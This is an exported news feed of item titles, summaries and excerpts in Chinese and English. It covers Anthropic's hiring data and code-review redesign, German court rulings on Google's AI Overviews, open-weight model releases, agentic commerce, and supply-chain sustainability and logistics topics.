items.description: Anthropic 发布内部研究称，技术部门初级岗位占比从 2025 年初的 21% 降至 14%，新招初级占比从 27% 降至 9%，空缺初级职位降至 6%，非技术部门基本稳定。 🔗 阅读原文 via AIHOT · https://aihot.news/items/c7pt5mbzh5h0atlbprfzbs8o0
items.excerpt:
Anthropic has nearly stopped hiring junior staff because AI agents now work six times as many hours
Anthropic 发布内部研究称，技术部门初级岗位占比从 2025 年初的 21% 降至 14%，新招初级占比从 27% 降至 9%，空缺初级职位降至 6%，非技术部门基本稳定。
Anthropic 内部数据显示初级技术岗位占比明显下降而 Agent 工时升至人力六倍，报道还保留了研究自身对数据局限性的说明。
Anthropic 在技术岗位中招聘的初级员工越来越少，而其 AI 智能体记录的工作时长却在持续攀升。
根据这家 AI 公司发布的一项 内部研究 ，自 2025 年初以来，技术部门初级岗位的占比从 21% 降至 14%。新员工的降幅更大，初级员工占比从 27% 跌至仅 9%。从 2025 年 12 月开始，开放的初级岗位数量下降尤为急剧。
Anthropic 将其归因于自家 AI 智能体能力的不断增强。到 2026 年 8 月，这些智能体记录的工作时长已是人类员工的六倍。编写代码和查找漏洞等任务越来越多地被交给 Claude。在 Claude 承担最复杂工作的岗位上，初级招聘的降幅最大。
据 Anthropic 称，各部门的生产力均有提升。工程师提交的代码提交量达到 5.1 倍，数据科学家运行的查询量达到 3.1 倍，法务团队处理的合同量达到 3.1 倍。销售团队成交的交易量达到 1.7 倍，招聘人员招聘的人数达到 1.4 倍，会计处理的发票量达到 1.4 倍。
不过，该研究本身也承认，Anthropic 是一个特例。它是一家极度依赖 AI 的软件公司，其结果难以直接套用到更广泛的经济体上。业务的快速增长和对 AI 工具的自愿采用也可能使数据出现偏差。到目前为止， 更广泛的经济体尚未显示出 AI 带来的可衡量生产力提升 。
北约特种作战大学的研究员 Nolan Lovett 最近在一篇研究论文中描述了 “认知公地悲剧” 。当个别企业用 AI 取代入门级岗位时，它们享受效率提升带来的收益，而成本则分摊到所有日后需要经验丰富人才的人身上。Anthropic 正符合这一模式。
熟练的专业人士只有通过在如今正在消失的初级岗位上多年实践才能成长起来。Lovett 认为，全面影响要到 2030 至 2045 年才会显现，因为当下可用的专家是在 5 到 20 年前培养出来的。软件工程、金融分析和法律研究是受影响最大的领域。
不过，Lovett 的预测只有在未来人类仍从事这类工作的前提下才成立。而这大概是 Anthropic 自己都不曾预期的： 该公司过去曾提出 ，程序员和呼叫中心工作人员最终需要转向电工或护士等职业。

items.title: Scope 3 Is Not Primarily a Reporting Problem. It Is a Supply Chain Data Problem
items.description: Scope 3 is fundamentally a supply-chain data architecture problem. Credibility depends on boundaries, activity data, factor governance, allocation, lineage, and explicit uncertainty—not on a more polished reporting layer. The post Scope 3 Is Not Primarily a Reporting Problem. It Is a Supply Chain Data Problem appeared first on Logistics Viewpoints .
items.excerpt:
Executive thesis. Scope 3 is fundamentally a supply-chain data architecture problem. Credibility depends on boundaries, activity data, factor governance, allocation, lineage, and explicit uncertainty—not on a more polished reporting layer.
Scope 3 reporting is often described as a carbon-accounting challenge, but much of the difficulty is more fundamental: obtaining reliable activity data across suppliers, carriers, products, facilities, and other parts of the value chain. When primary data is incomplete, organizations rely on estimates, factors, and allocation methods that introduce uncertainty. The quality of the result therefore depends on the quality and lineage of the underlying supply chain data.
Before calculation begins, the organization needs clear boundaries for which activities, entities, shipments, products, and periods are included. Inconsistent boundaries can create apparent changes that are methodological rather than operational. Governance should make those choices explicit and preserve them so results can be reproduced and compared over time.
Spend-based estimates can provide coverage when better information is unavailable, but operational activity data generally creates more effective insight. Shipment distance, mode, weight, equipment, fuel, energy, supplier activity, and other physical measures can connect emissions more directly to the processes the enterprise can change. That is what turns Scope 3 from a reporting exercise into a management tool.
A precise number can create false confidence if the source data is weak. Mature programs expose data quality, estimation methods, factor versions, allocation logic, and uncertainty. That allows leaders to distinguish categories where measurement is already decision-grade from areas where improving primary-data coverage should be the immediate priority.
The objective is not only to improve the inventory. It is to identify where operational changes can reduce emissions: mode shifts, utilization, routing, carrier choices, supplier changes, energy improvements, packaging, product design, or network configuration. Better data is valuable because it makes those levers easier to quantify and prioritize.

items.description: 慕尼黑地区法院 I 五月底裁定 Google 的 AI 搜索摘要属于公司自己的陈述而非中立转述，Google 须为错误内容担责；Google 公开宣布上诉后实际以和解结案，未获上级法院裁决。 🔗 阅读原文 via AIHOT · https://aihot.news/items/bbr25r9mbi8zbbtmu2uiati7f
items.excerpt:
Two German courts now hold Google liable for what its AI overviews say
慕尼黑地区法院 I 五月底裁定 Google 的 AI 搜索摘要属于公司自己的陈述而非中立转述，Google 须为错误内容担责；Google 公开宣布上诉后实际以和解结案，未获上级法院裁决。
两起德国法院判例指向同一法律逻辑，文章还分析了 Google 以和解回避判例对 AI 搜索商业模式的潜在影响。
Google曾试图通过上诉推翻慕尼黑一项关于AI搜索摘要责任的里程碑式裁决，随后悄然达成和解。如今，第二家法院采用了同样的推理。Google的AI回答被视为该公司自身的内容，Google需对其负责。
5月下旬，慕尼黑地区法院第一庭在一桩 备受关注的案件 中裁定，Google对其AI生成的搜索摘要内容负有直接责任。Google的AI曾错误地将两家慕尼黑出版商与欺诈计划关联。法官将AI概览归类为Google自身的陈述，而非单纯的搜索结果，这意味着该公司本身必须为其负责。
Google无法再躲在传递第三方信息的中立中间人角色背后，而必须为其AI生成的不法陈述承担责任。对于一个不断生成新答案的搜索功能而言，这是一种难以量化的法律风险。如果这一观点成立，可能会动摇德国AI搜索的整个商业模式，并影响其他国家的相关讨论。
搜索引用与原创内容之间的区分还可能产生超出虚假事实陈述之外的后果。如果AI回答被视为Google自身的内容，那么Google用来生成这些回答的文本所属的出版商，最终可能会主张自己的权利。这并非慕尼黑案件的一部分，但却是合乎逻辑的下一步。
据THE DECODER了解， Google公开宣布的上诉 从未走到裁决阶段。案件最终以和解告终，这意味着没有任何上级法院对慕尼黑的推理作出评判。为何达成和解以及是否涉及金钱往来尚不清楚。Google和受影响的出版商均拒绝置评。法院也拒绝就其裁决在具体案件之外的更广泛意义发表意见。
不过，慕尼黑法官的法律推理并未消亡。在 2026年9月24日的一项裁决中，亚琛地区法院 禁止Google传播某些虚假陈述，并明确援引了慕尼黑裁决的推理。Google可以对该禁令提出异议。该裁决尚未最终生效。
在这起新案件中，亚琛的一位医生对Google“AI模式”搜索功能中的严重虚假指控进行了反击。这位医生自2010年起至2026年6月下旬担任神经放射学首席医师和教授。8月28日，一位同事提醒他，Google的AI在解释其离职时，援引了一起据称针对其秘书的性侵事件。当用户使用“停职”“解雇”和“法庭程序”等词进行进一步搜索时，AI模式返回了详细的多段捏造内容。它甚至编造了完整的法律后续。
这些指控和程序均与该医生毫无关系。AI将涉及另一位前大学教授的事件安在了他身上，亚琛法院可以从自己的记录中确认这一点，因为刑事案件实际上是对另一个人提起的。 此类AI错误归因的案例 此前已有 记录 。
尽管医生在8月底详细描述了这一混淆情况，并通过电子邮件要求谷歌删除相关内容，但该公司在9月中旬表示不会采取任何行动。同日发出的正式法律要求同样没有下文。谷歌确认已收到该要求，但据法院称，这些由AI生成的虚假文本当时仍在线。
随后，亚琛地区法院禁止进一步传播三个有争议的文本版本。由于这些虚假陈述可能严重损害医生的职业声誉，法院在未听取谷歌意见的情况下采取了紧急行动。如果谷歌违反该命令，每次违规将面临最高25万欧元的罚款。
亚琛裁决最重要的部分在于它与慕尼黑推理的高度一致，这表明德国法院正在形成一致的法律观点。谷歌利用其AI生成自己的陈述，而非仅仅让第三方信息可被找到。法院写道：“被申请人提供AI生成的搜索，因此也应对在此背景下生成的答案负责。”
亚琛甚至直接引用了慕尼黑的裁决，指出谷歌的AI基于对多个第三方网站内容的评估和组合，生成“独立的、新的、实质性的陈述”。
法院表示，谷歌可以核查此类陈述，例如将其AI输出与其使用的来源网站进行比对。亚琛的法官还补充说，如果谷歌让其自家AI面对医生的异议，系统本会自行发现这些错误。
两起案件都引发了人们对谷歌针对其AI搜索功能所采取长期法律策略的疑问。如果德国法院继续将该公司归类为虚假陈述的发布者，而谷歌继续通过很可能是财务和解的方式规避判例，就会形成一种反常的激励。
对于专业律师事务所和受影响方而言，这可能变成一种有利可图的商业模式。他们可以用有针对性的查询探测AI搜索，直到语言模型拼凑出虚假、可能具有诽谤性的陈述，然后申请禁令并协商和解。这些系统很容易被操纵。
当然，谷歌有能力以这种方式让个别案件消失多年，因为只有至少一方将法律程序推进到底，才会形成具有约束力的判例。但谷歌的动机很可能远不止对个别虚假陈述的责任。如果最高法院裁定AI答案算作原创内容，那么为这些答案提供文本的发布者也可以主张自己的权利。在最极端的情况下，谷歌将不得不就其来源背后的创作者为每个AI生成的答案进行补偿。这将彻底颠覆AI搜索的经济模式。

items.title: Meta shakes up the frontiers, open and closed
items.description: US open weights are back!
items.excerpt:
This has been a week where the balance of American open-weight models took a step change back toward the frontier. Meta took the lead of this charge with Muse Spark Open , which is now the strongest American-made open model by quite some margin, but the addition of Reflection’s first model Beam is also relevant. Without these two models, there would be 20+ open-weight models built and released by Chinese companies better than the best Western models. At the time of writing this, Mistral has also announced a strong model, Mistral Large 4 , with an index score of 38 (see below), but its weights are not yet released. There are rumors of a few more strong American open-weight models coming from other organizations too!
In many ways, the gap between the best American and Chinese models has been reduced roughly by half. We’ve gone from the best American open models being largely irrelevant to consumers who require the cutting edge of performance, to them being behind but relevant.
This paints the picture of the cut-throat, competitive nature of the frontier model business. Reflection and Mistral announced their model scores and Meta dropped the weights of a smarter model before these other two labs could get their own weights out. All of these models are competing with Chinese models released months ago, where the industry is collectively asking — where have Kimi and Zhipu AI been since the releases of GLM-5.3 and Kimi K3 on Aug. 18th and Jul. 16th, respectively?
That is a very nuanced question, which I’ll dig into another time. Today’s piece is focused on Meta’s turnaround, what Muse Spark Open means for the ecosystem, and the balance of power across Western frontier labs.
One thing we see again and again at Interconnects through our open model analysis is that Western open-weight models get astonishingly more adoption than Chinese models with the same performance-to-size footprint (even though the Chinese models usually come out first)! Muse Spark Open is landing into this environment, at the same time as when open-ended LLM agents are finally real (~ GLM 5.2 capabilities and on ).

items.title: Supply Chain Sustainability Software Is Moving From Disclosure to Operational Decision-Making
items.description: Sustainability technology is moving from disclosure infrastructure toward operational decision support. Carbon and ESG data become strategically relevant only when they change sourcing, transportation, facility, product, or supplier decisions. The post Supply Chain Sustainability Software Is Moving From Disclosure to Operational Decision-Making appeared first on Logistics Viewpoints .
items.excerpt:
Executive thesis. Sustainability technology is moving from disclosure infrastructure toward operational decision support. Carbon and ESG data become strategically relevant only when they change sourcing, transportation, facility, product, or supplier decisions.
Supply chain sustainability technology developed largely around measurement and disclosure: calculate emissions, collect supplier information, produce reports, and demonstrate compliance. Those functions remain necessary, but they do not by themselves reduce impact. The strategic value appears when sustainability data begins to influence sourcing, network, transportation, facility, product, and supplier decisions.
Carbon accounting, supplier ESG, product footprints, transportation emissions, traceability, and reduction planning are related but not identical capabilities. They rely on different activity data, factors, boundaries, evidence, and operating workflows. Buyers should therefore start with the decisions the business needs to support rather than assume one sustainability platform can solve every problem equally well.
A defensible metric needs more than a calculated result. The enterprise should be able to trace boundaries, source data, factor versions, allocation rules, transformations, and overrides. This is especially material as sustainability information influences external reporting, customer commitments, procurement decisions, and capital allocation.
Sustainability systems become more consequential when they connect to procurement, ERP, TMS, facilities, products, carriers, and suppliers. Those connections allow the enterprise to compare operational alternatives before execution rather than calculate the environmental effect after the fact. The data architecture is therefore part of the sustainability strategy.
The effective question is not how many dashboards the organization can produce. It is whether the platform helps identify and prioritize reduction levers with an understandable economic and operational impact. Better mode selection, improved utilization, supplier changes, energy decisions, product redesign, and network changes are examples of actions that turn sustainability information into operating value.

items.title: Anthropic 如何在 Claude 写下 Claude Code 约 90% 代码后重新设计代码评审
items.description: 作者解读 Anthropic 关于 Claude Code 代码评审重构的博客：Claude 写了约 90% 的代码，2026 年 6 月到 9 月合并 PR 翻倍以上而 revert 率下降超 40%。 🔗 阅读原文 via AIHOT · https://aihot.news/items/p4mq9t7wyzlxritu15i6d8dtv
items.excerpt:
作者解读 Anthropic 关于 Claude Code 代码评审重构的博客：Claude 写了约 90% 的代码，2026 年 6 月到 9 月合并 PR 翻倍以上而 revert 率下降超 40%。
原文拆解了 Anthropic 重构代码评审的七层防线和收敛问题的具体解法，对引入 AI reviewer 的团队有可迁移的做法。
当 Claude 写了 Claude Code 约 90% 的代码后，团队如何重新设计代码评审 ？
Anthropic 没有取消代码评审，是把 “人读代码” 这个动作大部分交给了机器，把稀缺的人类注意力只花在真正需要判断力的地方。核心转变是：从“这段代码有人看过吗”变成“这个变更可能出什么问题，哪种检查（自动或人工）最适合抓住它”。 https://claude.dev/blog/solving-code-review-at-anthropic/
背景数字：2026 年 6 月到 9 月，合并的 PR 数量翻倍以上，而 revert 率下降超 40%。传统的“同事互相读 diff”模式在这个吞吐量下会先崩溃；人要么变成瓶颈，要么敷衍放行。
团队对成本的认识很清醒：人力时间 = 评审时间 + 修复坏代码的时间，压缩一头只会把成本转移到另一头。所以他们不追踪“评审覆盖率”这种虚荣指标，而转去追踪 “每个 PR 平均几个人类审批” 和 “等人审批的等待时间”，并以 revert 率 / 事故率作为护栏指标；目标是最多一个人在环（有时只有作者本人），且事故不比以前多。
1. PR 之前的自我验证 — Claude 必须出示证据（测试输出、构建、截图）而不是声称完成；再用一个全新上下文的第二个 agent 审 diff。Boris Cherny（Claude Code 创造者）认为给 Claude 一个验证方法是“最重要的事”，效果提升 2–3 倍。反复出现的问题会被固化到源头：写进 CLAUDE.md（项目约定）和 REVIEW.md（给代码主人看的指引——失败长什么样、nit 上限、哪些路径跳过，且每条发现必须附文件/行号证据）。
2. 每个 PR 必过 AI 评审 — 内部 PR 上“实质性评审意见”占比从 16% 升到 54%；千行以上的大 PR 几乎总能查出问题。多个 agent 并行找 bug，再有 verifier agent 对每条发现投票才发出。发现分为 Important / Nit / Pre-existing，每条必须解决或说明理由。
4. 阻塞性的自动检查 — lint、类型、跨平台测试、构建；PR 模板强制填写“如何测试的”和“如何回滚”，且需一人签字。
5. 基于风险的人工审批 — 分类器定级：低风险（文档、文案）不需人工；中风险（普通产品变更，及缓存、自动更新器、系统提示词等敏感区）一人；高风险两人。关键规则：agent 的批准永远不能算人工批准；批准只覆盖一个 commit，有新提交就要重新审批。
6. 合并队列 + 特性开关 + 灰度 — 针对合并后 main 重跑检查；新行为先给 Anthropic 内部员工，再走 latest channel，最后进 stable。
7. 快速检测与回滚 — 开关无需重新部署即可关闭；事故复盘必问“哪一层本该拦住它”。
1. 评审器本身也是被持续评测的系统。 过去引发事故的 PR（经专家确认）构成一个 eval 集，评审器每天跑分，只有分数提升的改动才被保留；噪声则通过“人对评论的反应”和“在已知干净的 PR 上跑评审器”来度量。这本质上是把“评审质量”从主观感受变成了可优化的目标函数。
2. 收敛问题的解法。 曾有一个 agent 写的 CLI PR 一夜跑了 50+ 轮评审，而 git blame 显示约 59% 被标记的代码在第一轮之前就存在；评审 agent 在翻旧账而不是审新变更。修复手段：三轮封顶（超过就退回来重新考虑方案）、后续轮次只看增量 diff、标记 bug 类别而非单行、禁止重复发现。效果：一轮通过率 65%→78%，5 轮以上 PR 从 8.9% 降到 1.5%，平均评审轮次 2.08→1.32。这是 AI 评审 AI 代码时特有的“死循环”问题，他们的解法值得所有引入 AI reviewer 的团队抄作业。
· 该不该做：方向、品味、范围； · 高危代码：计费、自动更新器、CI 工作流； · 可被复制模仿的架构决策； · 读证据：测试输出、截图、发现列表； · 为结果负责：每个上线变更背后必须有一个承担问责的人。
原文拆解了 Anthropic 重构代码评审的七层防线和收敛问题的具体解法，对引入 AI reviewer 的团队有可迁移的做法。

Integrated Systems Design, or ISD, last week launched its Palletizing Module, which builds outbound pallets and breaks down incoming ones in a single cell. Most competing systems handle only one direction, requiring separate equipment, separate floor space, and separate capital budgets for each function, according to the company.

The Wixom, Mich.-based company serves customers across food and beverage , consumer goods, industrial manufacturing , and third-party logistics ( 3PL ).
ISD’s Palletizing Module includes a robotic arm, custom end-of-arm tooling, machine vision, and integrated controls. The vision system identifies box or case dimensions in real time and adjusts placement patterns accordingly, whether the robot is building a pallet or breaking one down. Operators can switch the system between palletizing and depalletizing modes without reconfiguring hardware, said the company.

items.excerpt:
Great digital products rarely arrive fully formed. For startups, product teams, and established companies testing a new concept, custom MVP app development services can turn a promising idea into a working product before time, budget, and internal energy are spent in the wrong direction.
An MVP is not a rough draft thrown into the market. It is a focused version of a product built to test real demand, collect user feedback, and prove whether the concept has commercial potential. Instead of building everything at once, companies start with the core function that solves a specific problem. Then they learn. Then they improve.
This approach is especially valuable in markets where customer expectations change quickly. A product that looked perfect during internal planning can feel irrelevant once users interact with it. MVP development helps avoid that trap. It gives businesses a faster, safer, and more practical way to move from assumption to evidence.
A successful MVP is not defined by how many features it has. It is defined by how clearly it tests the main product hypothesis. The best MVPs are simple, sharp, and useful.
Every MVP should begin with a specific problem. Vague ideas usually lead to vague products. The team must understand who the users are, what they struggle with, and why the proposed solution is better than existing alternatives.
For example, “a productivity app” is too broad. “An app that helps field service teams report completed jobs with photos and digital signatures” is clearer. The second idea gives the development team something concrete to build and test.
An MVP should include only the features needed to deliver the core value. Everything else can wait. This discipline is difficult because teams often want to add more. More filters. More dashboards. More user roles. More integrations.
But every extra feature increases complexity, cost, and testing effort. A focused MVP protects the project from becoming too heavy too early.
Minimal does not mean unpleasant. Users still expect clear navigation, understandable screens, and a smooth basic experience. If the MVP is confusing, feedback may reflect poor usability rather than the strength of the idea.

Quantum computing is an emerging area of computing that researchers are exploring for certain complex optimization problems, including routing, scheduling, and resource allocation.
“Supply chains are highly dynamic, with decision-making that can have a far-reaching impact on efficiency and costs,” said Murray Thom, vice president of quantum technology evangelism at D-Wave. “We’re seeing quantum computing technologies emerge as potentially powerful alternatives to existing classical approaches.”
The collaboration between D-Wave and the SCMRC will explore foundational and applied research in quantum optimization for supply chain use cases, including transportation routing, logistics network design, inventory and resource allocation, scheduling, and decision-making under disruption. items.excerpt:
First Global Sustainable Logistics Survey sets baseline for UN Decade of Sustainable Transport initiative, examines key aspects of sustainability across logistics and supply chain.
Logistics service providers, manufacturers, and retailers largely agree on the measures that cut emissions and promote sustainability in logistics, but they struggle to scale them, according to results of the first Global Sustainable Logistics Survey (GSLS), released this week by Kühne Logistics University (KLU) and the Kuehne Climate Center (KCC).
The survey polled 1,085 professionals from 64 countries about sustainable logistics, covering three topics: sustainability solutions, skills, and adaptation to climate risks.
“Across all three areas, the same pattern emerges: professionals broadly agree on what needs to happen, but progress depends on whether individual companies, or the wider systems they rely on, are actually able to act,” GSLS researchers wrote in the inaugural report, which they say is the first global, longitudinal study on sustainable logistics and sets a baseline for tracking the sector over the United Nations (UN) Decade of Sustainable Transport initiative .
The report also makes recommendations for policymakers and logistics professionals on scaling sustainability solutions, building skills, and adapting to climate risks.
For policymakers, those recommendations include developing a “context-specific enabling policy framework” for sustainable logistics: “Frameworks should focus on solutions that are rated effective but rarely adopted, such as low-carbon fuels, electrification, and intermodal transport,” according to the report.
For managers, recommendations include moving ahead with capital-intensive solutions while demanding changes in policy frameworks: “Companies that move early build know-how and meet customer expectations before regulation requires it. Investments can be staged while preserving flexibility,” according to the report.
The survey and full report are available online from the Kuehne Climate Center.

items.title: This Week in Charts: Agents Denied
items.description: Super-Pareto TikTok Shop; Cure to High Prices is High Prices; Zoomers Living Large?
items.excerpt:
Agentic commerce is a thing. Muse and others advanced the timeline to “ agentic commerce is here right now—it was nice knowing you, old-school ecomm ” but then more recently, some big etailers (like Amazon) responded, “ not so fast—agent shoppers are officially instablocked .”
Now, the battle between what agents and bots can do vs. what the rest of the internet will allow them to do has been going on for some time, but the recent escalation does appear to show up in the data:
According to data from Cloudflare, the share of 403 “Forbidden” responses received by agents and bots has fattened considerably since the summer (and is ~double what it once was).
Whether that’s a response specifically to “agentic commerce” is a separate question, but presumably that’s at least some part of what’s going on. Etailers understandably don’t want to be disintermediated, and not only lose their customer relationships, but also lose those customer eyeballs that are a substantial source of advertising revenue for the large ecomm platforms.
There are likely other reasons why the Amazons of the world are apprehensive about agentic commerce, beyond simply eroding their platform advantages. First among those other concerns are likely fraud and returns, both of which have been a rising plague for ecomm more broadly:
According to data from the NRF, return rates and the total cost of returns have basically doubled and tripled, respectively, since 2019. Likewise, reported fraud is pervasive, with the most common concern being “dispute abuse,” i.e. customers buying something and then later disputing the charge. If the card issuer takes the customer’s side, the merchant is SOL.
It’s not hard to understand why etailers would be concerned that agentic commerce could make a worsening problem even worse. “ Oh, my agent bought that personalized varsity jacket with my name in sequins, not me, I’d never do that ” or “ I told my agent to buy socks at the best price, but I didn’t expect it would find the ‘10,000 pairs of argyles, wholesale special,’ so please send a return label and a forklift. ”
OK, so fraud, returns, customer relationships, and ad monetization are all throwing sand in the gears of the agentic commerce wave, but presumably those are solvable problems with better tech and commercial ingenuity.
There’s another problem, however, that may be holding back the bot-buying-spree: it’s possible that consumers don’t actually want their bots to do their shopping for them (yet).

items.title: a16z 图表周报：智能体购物遭电商拦截，消费意愿仍滞后
items.description: a16z 图表周报指出智能体商务遇阻，Cloudflare 数据显示智能体与爬虫收到的 403 拒绝响应自夏季起明显增多，约为原先两倍。文章引用 NRF 数据称退货率与退货成本自 2019 年以来分别翻倍和增至三倍，并引用调查指 42% 消费者完全不信任 AI 代购，Similarweb 数据显示 AI 购物多发生在发现与购买之间的中间阶段，而非下单环节。 🔗 阅读原文 via AIHOT · https://aihot.news/items/j5vlb3dn14h2b4xy1hbdschyc
items.excerpt:
a16z 图表周报指出智能体商务遇阻，Cloudflare 数据显示智能体与爬虫收到的 403 拒绝响应自夏季起明显增多，约为原先两倍。文章引用 NRF 数据称退货率与退货成本自 2019 年以来分别翻倍和增至三倍，并引用调查指 42% 消费者完全不信任 AI 代购，Similarweb 数据显示 AI 购物多发生在发现与购买之间的中间阶段，而非下单环节。
原文汇集 Cloudflare、Similarweb 等数据，指出智能体购物正遭遇电商封禁与消费者信任不足的双重阻力。
代理式商务 已经成真。Muse 和其他公司把时间线推进到了“ 代理式商务现在就在这里——认识你很高兴，老派电商 ”，但最近，一些大型电商（如 Amazon）回应道：“ 别急——代理购物者已被正式即时封禁 。”
如今，代理和机器人能做什么与互联网其余部分允许它们做什么之间的斗争已经持续了一段时间，但最近的升级确实似乎体现在数据中：
根据 Cloudflare 的数据，自夏季以来，代理和机器人收到的 403“Forbidden”响应占比大幅上升（约为过去的两倍）。
这是否是专门针对“代理式商务”的回应是另一个问题，但想必这至少是部分原因。电商不想被去中介化是可以理解的，它们不仅会失去客户关系，还会失去那些为大型电商平台带来可观广告收入的客户眼球。
除了平台优势被侵蚀之外，Amazon 们对代理式商务感到担忧可能还有其他原因。这些其他担忧中首当其冲的可能是欺诈和退货，这两者对整个电商而言都是日益严重的祸患：
根据 NRF 的数据，自 2019 年以来，退货率和退货总成本分别基本翻了一番和增至三倍。同样，报告的欺诈行为普遍存在，最常见的担忧是“争议滥用”，即客户购买了某物后又对扣款提出争议。如果发卡机构站在客户一边，商家就只能自认倒霉。
不难理解为什么电商会担心代理式商务可能让本已恶化的问题雪上加霜。“ 哦，我的代理买了那件用亮片拼出我名字的个性化校队夹克，不是我买的，我绝不会那样做 ”，或者“ 我告诉我的代理以最优价格买袜子，但我没想到它会找到‘10,000 双菱形花纹袜，批发特价’，所以请寄来退货标签和一辆叉车。 ”
好吧，欺诈、退货、客户关系和广告变现都在给代理式商务浪潮的齿轮里掺沙子，但想必这些问题都能通过更好的技术和商业智慧来解决。
然而，还有另一个问题可能正在阻碍机器人购物狂潮：消费者可能实际上（还）并不 想要 他们的机器人替他们购物。
截至目前（至少根据 某些 数据），消费者似乎普遍愿意接受 AI 帮助他们找到想要的东西，尤其是帮助他们找到最优价格，但在实际完成购买时，消费者似乎有些抗拒：
约 25% 的受访者表示，他们愿意让 AI 为他们购买各种消费品（奢侈品除外），但 42% 的人表示他们完全不相信 AI 能代表他们进行购买。这不到一半，但仍比人们预期的要多。
看来，就目前而言，消费者——和电商一样—— 也 担心误购、烦人的退货和拒付争议。此外，可能人们就是喜欢自己购物，至少在最终购买决定上是这样。
顺着这个思路，来自 Similarweb 的一些点击流数据（虽然有点过时）似乎印证了这一点：AI 适合用来咨询，但 购买 （目前）仍是人类的事。似乎有越来越多的“购物旅程”会在进入实际结账页面之前先访问 AI，但实际上绝大多数 AI 购物会话似乎都处于旅程的“中间阶段”，也就是在发现与购买之间：
这份数据确实应该打个折扣来看（因为点击流数据本就如此），但除此之外，其含义相当清楚：目前，消费者似乎主要用 AI 来对已经发现的产品做功课，而不是（a）用 AI 去发现产品，或（b）用 AI 做出最终的购买决定。
这让代理式商务的论证变得不那么直接，尤其让 AI 广告归因的问题变得更加不直接。如果某人在以 AI 为主导的购物旅程中段看到了一个推荐，但随后在另一个会话中做出了最终的购买决定，那么谁会知道是什么在何时把消费者的心意推向了哪个结果？
再次说明，数据似乎截止到 6 月，所以这是否仍然成立、更不用说是否会一直成立，都是未知数，但无论如何，购物者与机器人之间的关系比表面看起来要复杂得多。
既然谈到了电商，以及代理式商务可能带来的颠覆（或不会），事实证明 TikTok Shop 上的社交电商在社交部分和商务部分都呈现出 惊人的 右尾偏斜。
根据 Marketplace Pulse 的数据，8.4% 的 TikTok Shop 卖家制作了 1000 个以上视频，并占据了约 60% 的总销售额。视频做得越多，东西卖得越多。
同样根据 Marketplace Pulse 的数据，约 60% 的销售额由排名前 1% 的卖家贡献，而 约 93% 的销售额由排名前 10% 的卖家贡献 。
除了惊叹于（超级）帕累托分布的顽固之外，实在很难说这到底意味着什么，但 Charts 还是试着解读一下。
一方面，制作大量大量视频似乎是推动销售的好方法，这意味着购物体验中显然有某种“个人化”的东西是代理难以复制的（不过，如果 Muse 直播它的旅程，情况或许会改变）。
另一方面，如果代理式商务真的起飞，那么对于这一小群但极具影响力的高产内容创作者来说意味着什么？他们通过一种与代理毫无关联的媒介来推动销售。
当然，代理式商务和社交电商不必互相排斥。零售业规模巨大，容得下不止一种模式。但总体来看，我们如今的购物方式在某种程度上是为人类界面而优化的，以至于“只要加上代理”可能低估了这一点。
Charts 无意在“通胀：会还是不会”的争论中站队，但它愿意花点时间思考那句老话——“高价的解药就是高价”，因为这确实值得一番考量。
基本前提很简单：如果价格涨得足够高，就会抑制需求——要么是对该商品本身的需求，要么是对其他商品的需求，因为需求方为这个如今更贵的东西花了太多钱，就再也负担不起其他东西了。众所周知，当需求下降时，价格往往会随之下降……所以，如果高价最终抑制了需求，而受抑制的需求又导致价格下跌，那么高价的解药就是……高价。

items.title: Supply Chain Resilience Is Not Visibility. It Is the Ability to Execute Alternatives
items.description: Visibility tells the enterprise that disruption exists; resilience determines whether it can do something different. The distinction is the availability of executable alternatives and the decision rights to use them. The post Supply Chain Resilience Is Not Visibility. It Is the Ability to Execute Alternatives appeared first on Logistics Viewpoints .
items.excerpt:
Executive thesis. Visibility tells the enterprise that disruption exists; resilience determines whether it can do something different. The distinction is the availability of executable alternatives and the decision rights to use them.
A supply chain can have excellent visibility into a disruption and still be unable to respond. Knowing that a supplier is offline, a lane is blocked, or a facility has lost capacity matters, but resilience depends on whether the organization has viable alternatives and the authority to use them. Visibility tells the business what changed. Resilience determines what it can do about it.
Alternate suppliers, substitute materials, qualified routes, buffer inventory, flexible capacity, secondary facilities, and manual fallback cannot usually be created at the moment of disruption. They require advance investment, qualification, contracts, data, and operating procedures. That makes resilience a network-design and operating-model discipline rather than an emergency-response activity.
A viable alternative has limited value if nobody knows who can activate it or if approval requires a long chain of escalation. Resilient organizations define thresholds and decision rights in advance, especially for premium freight, inventory reallocation, supplier substitution, customer prioritization, and temporary process changes. Governance is therefore part of resilience.
Risk sensing, planning, network models, inventory data, transportation, supplier information, and workflow should help the organization move from a disruption signal to a set of executable responses. The technology does not create resilience by itself. It makes the available options easier to understand, compare, approve, and execute.
Plans that have never been tested often depend on outdated assumptions, unavailable capacity, stale contact information, or processes that no longer match the current network. Scenario exercises and recovery tests are therefore operational evidence. They reveal whether the organization can actually use the alternatives it believes it has.

items.title: 83% of Supply Chain Leaders Say Their Workers Aren’t Ready for AI
items.description: A new ASCM and DSCI report finds 83% of respondents say their workers aren’t ready for AI, as skills gaps and unclear returns slow adoption.
items.excerpt:
Most supply chain leaders say their employees are unprepared to use AI, according to a new report from the Association for Supply Chain Management ( ASCM ) and the Digital Supply Chain Institute ( DSCI ). The study found that 83% of respondents say their workers aren’t ready to use AI effectively, even as their companies plan to make it part of everyday work.
The joint study, The People Paradox in Supply Chain AI Integration , found that 91% of organizations plan to use AI to help human workers, while just 7% expect it to directly replace them.
Researchers collected 144 survey responses and used 107 for detailed analysis. Respondents included managers, directors, executives, and staff, with about 62% based in North America.
“AI adoption in supply chain is more about people than it is technology ,” said ASCM CEO Abe Eshkenazi. “The organizations making real progress treat workforce readiness as part of the technology investment, not an afterthought. They learn by doing, bring managers into the process early, and build trust one function at a time.”
The report found that half of directors, 51% of managers, and 70% of staff knew about their organizations’ AI initiatives without actively participating. Another 20% of staff reported no involvement at all.
Workforce skills and resources tied to an unclear business case or return on investment were the most frequently cited barriers, each at 33%. Poor data quality followed at 25%, while change management and governance or compliance risks each drew 21%.
Companies that described their workforce as prepared reported a 71% AI project success rate, compared with 28% among unprepared organizations. The prepared group had used AI across an average of six supply chain functions, while roughly 64% of unprepared organizations remained in planning or pilot stages.
Across 13 supply chain functions, average AI adoption scored 1.94 on a five-point scale. A score of one meant no AI use, while five meant AI could act without human review.
Demand planning led at 2.28, followed by supply and inventory planning at 2.12. Reverse logistics ranked last at 1.59, and 55% of respondents described their AI projects as somewhat successful.
The report recommends involving directors and managers early in tool selection and work process design. It also calls for starting with a manageable project with clean data, a responsible owner and measurable results.

